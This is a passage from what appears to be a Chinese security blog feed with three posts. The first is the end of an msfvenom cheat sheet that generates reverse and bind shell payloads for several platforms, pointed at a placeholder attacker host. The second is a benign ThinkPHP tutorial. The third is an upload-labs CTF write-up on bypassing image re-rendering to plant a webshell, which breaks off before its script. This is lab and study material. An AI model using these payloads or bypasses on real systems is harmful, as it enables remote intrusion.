title="-p"></a>-p</h4><p>-p：指定要生成的有效负载</p><p>Linux</p><p>反向连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></p><p>正向连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></p><p>Windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.ex</span><br></pre></td></tr></table></figure></p><p>Mac<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br><span class="line">Web Payloads</span><br></pre></td></tr></table></figure></p><p>PHP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure></p><p>ASP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><p>JSP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure></p><p>WAR<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.wa</span><br><span class="line">Scripting Payloads</span><br></pre></td></tr></table></figure></p><p>Python<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure></p><p>Bash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure></p><p>Perl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure></p><p>Linux Based Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure></p><p>Windows Based Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure></p><p>Mac Based Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br><span class="line">Handlers</span><br></pre></td></tr></table></figure></p><h4 id="自选模块"><a href="#自选模块" class="headerlink" title="自选模块"></a>自选模块</h4><p>生成执行计算器payload例子:</p><blockquote><p>   msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; 1.exe</p></blockquote><h4 id="友情链接"><a href="#友情链接" class="headerlink" title="友情链接"></a>友情链接</h4><p>查资料的时候发现这位大佬总结的特别好，还想深入了解metasploit直接<a href="https://thief.one/2017/08/01/1/" target="_blank" rel="noopener">传送门</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://xz.aliyun.com/t/2381" target="_blank" rel="noopener">https://xz.aliyun.com/t/2381</a><br><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a><br><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/msfvenom/</a><br><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</a><br><a href="https://xz.aliyun.com/t/2380" target="_blank" rel="noopener">https://xz.aliyun.com/t/2380</a><br><a href="https://thief.one/2017/08/01/1/" target="_blank" rel="noopener">https://thief.one/2017/08/01/1/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      如何使用metasploit构造shell脚本
    
    </summary>
    
      <category term="工具" scheme="https://museljh.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Matesploit" scheme="https://museljh.github.io/tags/Matesploit/"/>
    
  </entry>
  
  <entry>
    <title>从零开始学习PHP框架之ThinkPHP</title>
    <link href="https://museljh.github.io/2019/02/17/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0PHP%E6%A1%86%E6%9E%B6%E4%B9%8BThinkPHP/"/>
    <id>https://museljh.github.io/2019/02/17/从零开始学习PHP框架之ThinkPHP/</id>
    <published>2019-02-17T13:39:39.000Z</published>
    <updated>2019-02-17T13:51:32.301Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在大多数PHP项目都是基于框架进行开发的，所以学习PHP框架最了解PHP编写web应用程序有着十分重要的作用，也能让我们不仅仅从局部角度去思考一个漏洞为什么产生，而能够让我们以一种全局的眼观看待一个漏洞产生的始末。本文也主要是讲解如何熟练上手PHP框架。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="一、PHP框架的简要介绍"><a href="#一、PHP框架的简要介绍" class="headerlink" title="一、PHP框架的简要介绍"></a>一、PHP框架的简要介绍</h3><p>形象的来说，PHP框架 把 PHP 程序开发摆到了流水线上。换句话说，PHP开发框架有助于促进快速软件开发（RAD），这节约了你的时间，有助于创建更为稳定的程序，并减少开发者的重复编写代码的劳动。<br>我们通常认为PHP框架的作用相当于模型-视图-控制器（Model View<br>Controller）。MVC是种编程的架构模式，将业务逻辑从UI中分离出来，允许一个一个单独修改。它隔离了业务逻辑与 UI，允许其一改变而另一者不受影响；在 MVC 中，模型负责数据，视图负责表现，控制器则是程序主体或者说是负责业务逻辑。从本质上说，MVC 拆分了一个程序的开发过程，这样你就可以修改独立的每一部分，而其他部分不受影响。这是十分重要的，它使得编写 PHP 代码更为快捷简单。<br>PHP框架 已经对常见的安全性如表单检测、SQL注入等常见的安全问题做了一定的内置处理。当然，不是用上 PHP 就绝对安全了，最重要的还是要程序开发人员自己有安全意识与经验。</p><h3 id="二、php常见框架"><a href="#二、php常见框架" class="headerlink" title="二、php常见框架"></a>二、php常见框架</h3><p>在Github上搜索PHP<br><img src="https://i.imgur.com/NhuUm1c.png" alt=""><br><img src="https://i.imgur.com/7cvJJLQ.png" alt=""><br>在过去几年中，Lavarel有很明显的优势一直处在最热门PHP框架的冠军位置，同样在2019年也是如此，在Github star数甚至是第二名的差不多2.5倍可见它的受欢迎程度。当然常见框架除了laravel还有symfony、CodeIgniter、yii2、cakephp、ZendFramework当然还有国产的THinkPHP，<br>在谷歌走势图中<br><img src="https://i.imgur.com/A72fBJf.png" alt=""><br>laravel在世界始终是排名第一，并且远远超过其他<br>但是在中国PHP框架使用最多的却是yii这里并不包括thinkphp<br><img src="https://i.imgur.com/VijZmEt.png" alt=""><br>具体原因很多，主要原因可能是国内还需要科学上网的原因？或者是laravel学习门槛要比ThinkPHP高很多的原因。反正原因很多，<br>在中国还是thinkPHP以及yii2比较流行</p><h3 id="三、如何上手一个新的框架"><a href="#三、如何上手一个新的框架" class="headerlink" title="三、如何上手一个新的框架"></a>三、如何上手一个新的框架</h3><p>如今的PHP框架层出不穷，我该如何才能更快地开始使用某个新的框架呢?最简单的方式就是练习几个简单的demo来熟悉这个框架<br>1、你好世界（hello world）<br>这里练习的必要性我就不多作说明了。在一个新的框架上构建一个应用，在页面中显示“‘hello world”。当然，做起来不会那么简单。</p><p>2、计算器（calculator）<br>写一个简单的计算器程序，结合表单，对两个操作数进行加减乘除等运算，并把结果输出到页面上。你需要为每一种运算设置单独的动作，或者说方法（每个框架的叫法不一样），而且还要用到框架中的表单验证功能（如果框架提供了这一功能的话）。</p><p>3、留言板（guestbook）<br>让我们回到1998年——建立一个留言本程序，在页面上显示一个表单让用户填写，然后提交到这个应用程序里，继而存储到数据库或文本文件中（视你自己的情况而定），并把用户留言的内容显示到页面上。如果框架提供了创建HTML表单、对象模型或层等功能，就用上它们吧。</p><p>4、解析和分页（parse and paginate）<br>选一个RSS源或其他XML源，解析其中的条目并显示出来。同时添加一个分页的功能，让用户可以五条五条地浏览，并在页面的顶部或底部添加页码。如果框架里提供了这样的功能，就使用它吧。</p><p>完成以上的练习后，你应该就可以清楚地知道如何使用这个框架了，并能用它完成更复杂的工作，或是继续探索这个框架的其他功能。如果你还是不会用，或者花了很多时间来完成以上练习，那么我觉得这个框架不适合你，还是找些其他的来用吧。</p><p>记住，如果在使用框架的过程中遇到困难，记得去该框架的社区里寻求帮助。一个有这强大社区支持的框架会为你未来的工作带来很大帮助，同时也表明这个框架是个不错的框架。没有人希望在使用某框架后的六个月，框架的开发者就宣布停止开发，这就太气人了。</p><h3 id="四、开发环境搭建"><a href="#四、开发环境搭建" class="headerlink" title="四、开发环境搭建"></a>四、开发环境搭建</h3><p>环境：Visual Studio Code<br>     PHPstudy<br>     xdebug<br>     <a href="https://zhuanlan.zhihu.com/p/25844268" target="_blank" rel="noopener">用Visual Studio Code Debug世界上最好语言</a></p><h3 id="五、thinkPHP"><a href="#五、thinkPHP" class="headerlink" title="五、thinkPHP"></a>五、thinkPHP</h3><p>毕竟thinkPHP可以说是在中国最受欢迎的PHP框架所以我们首先学习它.</p><h4 id="1、thinkPHP简介"><a href="#1、thinkPHP简介" class="headerlink" title="1、thinkPHP简介"></a>1、thinkPHP简介</h4><p>ThinkPHP(FCS)是一个轻量级的中型框架，是从Java的Struts结构移植过来的中文PHP开发框架。它使用面向对象的开发结构和MVC模式，并且模拟实现了Struts的标签库，各方面都比较人性化，熟悉J2EE的开发人员相对比较容易上手，适合php框架初学者。 ThinkPHP的宗旨是简化开发、提高效率、易于扩展，其在对数据库的支持方面已经包括MySQL、MSSQL、Sqlite、PgSQL、 Oracle，以及PDO的支持。ThinkPHP有着丰富的文档和示例，框架的兼容性较强，但是其功能有限，因此更适合用于中小项目的开发。</p><p>优点：</p><p>1.易于上手，有丰富的中文文档；</p><p>2.框架的兼容性较强，PHP4和PHP5完全兼容、完全支持UTF8等。</p><ol start="3"><li>适合用于中小项目的开发</li></ol><p>缺点：</p><p>1.对Ajax的支持不是很好；</p><p>2.目录结构混乱，需要花时间整理；</p><p>3.上手容易，但是深入学习较难。</p><h4 id="1、基于ThinkPHP输出hello-world"><a href="#1、基于ThinkPHP输出hello-world" class="headerlink" title="1、基于ThinkPHP输出hello world"></a>1、基于ThinkPHP输出hello world</h4><p>零基础的化直接看<a href="https://www.kancloud.cn/yunzhiclub/thinkphp5guide/164724" target="_blank" rel="noopener">ThinkPHP5入门实例教程</a><br>想较为深入了解的话可以看官方的开发手册<a href="https://www.kancloud.cn/manual/thinkphp5/118007" target="_blank" rel="noopener">ThinkPHP5完全开发手册</a><br>几个注意事项</p><blockquote><p>1.ThinkPHP完整版和核心版区别在于:完整版比核心版多了很多扩展插件，而核心版只有核心函数</p></blockquote><h4 id="2、基于ThinkPHP的教师管理"><a href="#2、基于ThinkPHP的教师管理" class="headerlink" title="2、基于ThinkPHP的教师管理"></a>2、基于ThinkPHP的教师管理</h4><p>加深下印象<a href="https://www.kancloud.cn/yunzhiclub/thinkphp5guide/164724" target="_blank" rel="noopener">ThinkPHP5入门实例教程</a><br><a href="https://blog.csdn.net/WYpersist/article/details/79834490" target="_blank" rel="noopener">Navicat for MySQL 安装和破解（完美)</a></p><h4 id="3、深入"><a href="#3、深入" class="headerlink" title="3、深入"></a>3、深入</h4><p>如果还想继续了解ThinKPHP的话继续看ThinkPHP5入门实例教程就好了。当然如果想对ThinkPHP整体有着深入了解的话可以去专研ThinkPHP5完全开发手册</p><h3 id="3-ThinkPHP安全"><a href="#3-ThinkPHP安全" class="headerlink" title="3.ThinkPHP安全"></a>3.ThinkPHP安全</h3><h4 id="1-输入安全"><a href="#1-输入安全" class="headerlink" title="1.输入安全"></a>1.输入安全</h4><p>永远不要相信用户提交的数据，建议务必遵守下面规则：<br>设置public目录为唯一对外访问目录，不要把资源文件放入应用目录；<br>开启表单令牌验证避免数据的重复提交，能起到CSRF防御作用；<br>使用框架提供的请求变量获取方法（Request类param方法及input助手函数）而不是原生系统变量获取用户输入数据；<br>对不同的应用需求设置default_filter过滤规则（默认没有任何过滤规则），常见的安全过滤函数包括stripslashes、htmlentities、htmlspecialchars和strip_tags等，请根据业务场景选择最合适的过滤方法；<br>使用验证类或者验证方法对业务数据设置必要的验证规则；<br>如果可能开启强制路由或者设置MISS路由规则，严格规范每个URL请求；</p><h4 id="2-数据库安全"><a href="#2-数据库安全" class="headerlink" title="2.数据库安全"></a>2.数据库安全</h4><p>尽量少使用数组查询条件而应该使用查询表达式替代；<br>尽量少使用字符串查询条件，如果不得已的情况下 使用手动参数绑定功能；<br>不要让用户输入决定要查询或者写入的字段；<br>对于敏感数据在输出的时候使用hidden方法进行隐藏；<br>对于数据的写入操作应当做好权限检查工作；<br>写入数据严格使用field方法限制写入字段；<br>对于需要输出到页面的数据做好必要的XSS过滤；</p><h4 id="3-上传安全"><a href="#3-上传安全" class="headerlink" title="3.上传安全"></a>3.上传安全</h4><p>统的think\File提供了文件上传的安全支持，包括对文件后缀、文件类型、文件大小以及上传图片文件的合法性检查，确保你已经在上传操作中启用了这些合法性检查。</p><p>为了方便版本升级，并且保证public目录为唯一的web可访问目录，资源文件可以放到项目之外，例如项目目录为</p><blockquote><p>/home/www/thinkphp/</p></blockquote><p>那么资源目录、上传文件保存的目录</p><blockquote><p>/home/www/resource/<br>/home/www/resource/upload/</p></blockquote><p>为了项目的可维护性，目录操作最好不超出本项目的根目录，所以需要把resource目录映射到根目录</p><blockquote><p>ln -s /home/www/resource/  /home/www/thinkphp/resource/</p></blockquote><p>如果上传文件也需要web访问，可以生成一个软连接到public</p><blockquote><p>ln -s /home/www/thinkphp/resource/upload/  /home/www/thinkphp/public/upload/</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://my.oschina.net/justjavac/blog/70393" target="_blank" rel="noopener">https://my.oschina.net/justjavac/blog/70393</a><br><a href="https://blog.csdn.net/qq_16030133/article/details/81067544" target="_blank" rel="noopener">https://blog.csdn.net/qq_16030133/article/details/81067544</a><br><a href="http://www.devacg.com/?post=842" target="_blank" rel="noopener">http://www.devacg.com/?post=842</a><br><a href="https://blog.csdn.net/Vezn_King/article/details/75453717" target="_blank" rel="noopener">https://blog.csdn.net/Vezn_King/article/details/75453717</a><br><a href="https://zhuanlan.zhihu.com/p/25844268" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25844268</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      从开发环境，到代码调试，再到搭建自己的基于Thinkphp小demo，一切从零开始
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="php框架" scheme="https://museljh.github.io/tags/php%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs-writeup 16~20</title>
    <link href="https://museljh.github.io/2019/02/16/upload-labs-writeup%2016~20/"/>
    <id>https://museljh.github.io/2019/02/16/upload-labs-writeup 16~20/</id>
    <published>2019-02-16T15:34:26.000Z</published>
    <updated>2019-02-16T15:43:25.597Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>upload-labs是一个基于php语言的上传漏洞的靶场项目包括(最新commit17ec936) 的19个上传关卡的方法。可以通过git clone <a href="https://github.com/c0ny1/upload-labs.git" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs.git</a> 来搭建属于自己的一个upload练习靶场</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><img src="https://i.imgur.com/hiUxIwF.png" alt=""></p><h3 id="Pass-016-二次渲染绕过"><a href="#Pass-016-二次渲染绕过" class="headerlink" title="Pass-016  二次渲染绕过"></a>Pass-016  二次渲染绕过</h3><p>先看下源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">    $filetype = $_FILES[&apos;upload_file&apos;][&apos;type&apos;];</span><br><span class="line">    $tmpname = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.&apos;/&apos;.basename($filename);</span><br><span class="line"></span><br><span class="line">    // 获得上传文件的扩展名</span><br><span class="line">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&apos;/&apos;.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.png&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&apos;/&apos;.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&apos;/&apos;.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这是基于白名单的过滤<br>这次的判断不仅仅是判断文件后缀，还要判断文件是要对于类型的，<br>感觉图片🐎依旧是能够绕过，（什么是图片🐎可以看之前文章）<br>尝试下<br><img src="https://i.imgur.com/h4aiwnt.png" alt=""><br>？？？<br>那么<br><img src="https://i.imgur.com/8AwsxIK.png" alt=""><br>这个又是神马用处？？？<br>但是用winhex打开图片🐎，拉到最下面<br><img src="https://i.imgur.com/n00u5cD.png" alt=""><br>我的🐎呢？？？？<br>🐎跑哪里去了？？？<br>原来这关里用到了php的imagecreatefromjpeg、imagecreatefrompng、imagecreatefromgif这几个图片处理函数对上传的图片进行了二次渲染生成了新的图片，所以如果在这里上传的是一个普通的图片马，虽然图片马可以上传成功，但是上传的图片马在经过二次渲染后，imagecreatefromjpeg二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。图片尾部的php代码就会被删除掉，所以在这里不能使用直接在图片尾部添加一句话木马的方式去合成图片马。<br>原来如此，斗气化🐎也不是万能的，<br>那么我们如何绕过呢？<br>这里又一个非常明显的逻辑错误<br>这里首先<br><img src="https://i.imgur.com/GVNP8Gc.png" alt=""><br>当这个图片🐎不是真正图片的时候它就不会进行二次渲染<br>那么我们直接将PHP文件改成JPG形式的🐎就可以绕过了。<br>我们尝试下<br><img src="https://i.imgur.com/v9hDCmw.png" alt=""><br>但是其实已经上传成功了，然鹅这只是我们想想而已如果判断错误会有个unlink函数，直接将我们上传的图片删除了<br>那么我们该如何绕过呢？<br>我们先将php的代码放在中间<br><img src="https://i.imgur.com/dMXIn65.png" alt=""><br>失败，<br>具体可以看<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">这里</a></p><p>这里采取国外大牛的一个脚本，将jpg改成图片🐎绕过二次渲染限制<br><a href="http://link.zhihu.com/?target=https%3A//secgeek.net/bookfresh-vulnerability/" target="_blank" rel="noopener">国外大牛</a>，有兴趣的可以点这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span 